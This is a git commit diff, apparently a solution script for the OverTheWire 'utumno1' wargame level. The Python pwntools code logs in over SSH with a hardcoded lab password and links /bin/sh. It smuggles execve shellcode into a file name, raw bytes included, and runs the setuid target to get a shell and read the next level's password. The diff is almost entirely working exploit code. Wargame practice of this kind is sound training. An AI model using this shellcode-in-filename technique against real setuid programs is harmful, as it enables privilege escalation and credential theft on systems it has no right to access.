8d75f68983876ebcd611544c5a76c9d13ace89a1
whatsyourask <lexeymartynov@gmail.com>
2021-04-03 07:24:16 -0400

    Completed exploit

--- OverTheWire/utumno/utumno1.py
+++ OverTheWire/utumno/utumno1.py
@@ -15,15 +15,19 @@ def shellcode_crafting():
     shellcode += shellcraft.syscall()
     return shellcode
 
-
+'''
+So, main vulnerability here is that the strncmp checks only the first 3 chars of file name
+Just to place shellcode that spawn a shell is impossible, so I placed a shellcode to execve the symlink on the shell
+'''
 con = ssh('utumno1', 'utumno.labs.overthewire.org', password='aathaeyiew', port=2227)
 p = con.process('sh')
 p.sendline('cd /tmp/utum1/ && ln -s /bin/sh pwnp')
+#shellcode = b'\x31\xc0\x50\x68\x70\x77\x6e\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
 shellcode = shellcode_crafting()
 print(shellcode)
 print(asm(shellcode))
+#p.sendline(b'touch sh_$(python -c \'print "\x31\xc0\x50\x68\x70\x77\x6e\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"\')')
 p.sendline(b'touch sh_' + asm(shellcode))
-p2 = con.process(['/utumno/utumno1', '/tmp/utum1/'])
-print(p2.recv())
-print(p2.recv())
-print(p2.recv())
+p.sendline('/utumno/utumno1 /tmp/utum1')
+# For some reasons p.sendline('cat /etc/utumno_pass/utumno2') doesn't work here properly, so here interactive()
+p.interactive()
